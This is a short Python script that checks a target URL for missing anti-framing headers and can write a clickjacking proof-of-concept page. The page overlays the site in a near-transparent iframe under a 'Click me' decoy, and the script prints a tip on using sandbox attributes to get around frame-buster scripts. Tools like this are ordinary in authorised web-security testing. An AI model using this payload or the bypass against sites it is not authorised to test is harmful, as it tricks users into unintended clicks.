import requests

def create_PoC(url):
    PoC = f"""
            <!DOCTYPE HTML>
            <html>
               <head><title>Clickjack test page</title></head>
               <body>
                    <div style = "position:absolute; top:470px; left:60px; z-index: 1;">Click me</div>
                    <iframe src="{url}" style = "position:relative; width: 500px; height: 700px; opacity: 0.1; z-index: 2;"></iframe>
               </body>
            </html>
            """
    with open("PoC_Page.html", 'w') as file:
        file.write(PoC)
    print("[+] Note: If the page can't be framed due to Frame Buster Script try to add sandbox='allow-forms', sandbox='allow-scripts' into iframe tag")
def clickjacking(url, PoC_Script):
    try:
        headers = requests.get(url).headers
        if "X-Frame-Options" not in headers and "Content-Security-Policy" not in headers:
            print("[+] Potential clickjacking")
            if PoC_Script:
                create_PoC(url)
        else:
            print("[-] may be not vulnerable to clickjacking")
    except requests.RequestException as error:
        print(f"An error occurred: {error}")

if __name__ == "__main__":
    url = input("Enter the target URL: ")
    PoC_Script = int(input("Create an Exploit Script for PoC? 1 for ok 0 for no: "))
    clickjacking(url, PoC_Script)
